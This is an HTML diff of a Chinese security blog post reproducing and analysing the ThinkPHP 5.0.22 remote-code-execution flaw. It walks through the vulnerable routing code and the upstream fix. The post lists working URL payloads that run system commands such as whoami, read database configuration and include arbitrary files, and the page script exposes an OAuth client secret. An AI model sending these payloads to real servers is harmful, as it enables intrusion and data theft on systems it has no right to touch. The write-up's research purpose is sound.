@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ThinkPHP5.0.22]未开启强制路由RCE漏洞复现 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="漏洞影响范围：
+ThinkPHP 5.0.7-5.0.22
+ThinkPHP 5.1.x
+环境搭建
+在github上下载源码
+https://github.com/top-think/think/releases/tag/v5.0.22
+
+..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ThinkPHP5.0.22]未开启强制路由RCE漏洞复现</h2>
+            <div class="post-date">2024-04-04</div>
+            
+            <div class="post-content" v-pre>
+              <p>漏洞影响范围：<br>
+ThinkPHP 5.0.7-5.0.22<br>
+ThinkPHP 5.1.x</p>
+<h1 id="环境搭建">环境搭建</h1>
+<p>在github上下载源码</p>
+<pre><code>https://github.com/top-think/think/releases/tag/v5.0.22
+</code></pre>
+<p>修改<code>composer.json</code>中版本，不然执行<code>composer update</code>默认会升级到5.0.25的安全版本。</p>
+<pre><code>&quot;require&quot;: {
+        &quot;php&quot;: &quot;&gt;=5.4.0&quot;,
+        &quot;topthink/framework&quot;: &quot;5.0.22&quot;
+    },
+</code></pre>
+<p>在<code>composer.json</code>目录下执行<code>composer update</code><br>
+访问http://localhost/public/index.php，搭建成功。<br>
+<img src="https://fallingskies22.github.io/post-images/1712198520109.png" alt="" loading="lazy"></p>
+<p>PHP版本若为8.0，运行payload时会报错。</p>
+<pre><code>Method ReflectionParameter::getClass() is deprecated
+</code></pre>
+<p>getClass()函数废弃了，改用了getType()函数。</p>
+<p>这里直接换PHP版本为7</p>
+<h1 id="调试分析">调试分析</h1>
+<p>默认开启兼容模式，未开启强制路由。<br>
+<img src="https://fallingskies22.github.io/post-images/1712199885020.png" alt="" loading="lazy"></p>
+<p>payload</p>
+<pre><code>?s=index|think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=whoami
+</code></pre>
+<p>跟进routeCheck函数<br>
+<img src="https://fallingskies22.github.io/post-images/1712207622294.png" alt="" loading="lazy"></p>
+<p>这里因为未开启强制路由<code>url_route_must</code>,会走到下面的parseUrl<br>
+<img src="https://fallingskies22.github.io/post-images/1712207682343.png" alt="" loading="lazy"></p>
+<p>parseUrl函数以<code>/</code>为分界符，将URL分为模块/控制器/函数形式。</p>
+<p>然后调用exec函数，根据type形式，走进module函数中。<br>
+<img src="https://fallingskies22.github.io/post-images/1712208005128.png" alt="" loading="lazy"></p>
+<p>获取控制器和函数后，通过invokeMethod以反射方式调用方法。<br>
+<img src="https://fallingskies22.github.io/post-images/1712208233347.png" alt="" loading="lazy"></p>
+<p>这里关键在未验证控制器的合法性，我们用<code>think\app</code>可获取到当前模块外的其他控制器。</p>
+<p>所以payload不止这一种，因为可以调用任意函数。</p>
+<pre><code>?s=index/think\config/get&amp;name=database.username # 获取配置信息
+?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件
+?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami
+</code></pre>
+<h1 id="漏洞修复">漏洞修复</h1>
+<pre><code class="language-PHP">// 获取控制器名
+$controller = strip_tags($result[1] ?: $config['default_controller']);
+
+if (!preg_match('/^[A-Za-z](\w|\.)*$/', $controller)) {
+	throw new HttpException(404, 'controller not exists:' . $controller);
+}
+</code></pre>
+<p>使用正则对Controller名进行了正则校验。<br>
+只能含字母或者<code>.</code>，不能使用<code>\</code>了</p>
+<h1 id="参考">参考</h1>
+<p>https://xz.aliyun.com/t/8312<br>
+https://y4er.com/posts/thinkphp5-rce</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/htb-mist/">
+                  <h3 class="post-title">
+                    HTB - Mist
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
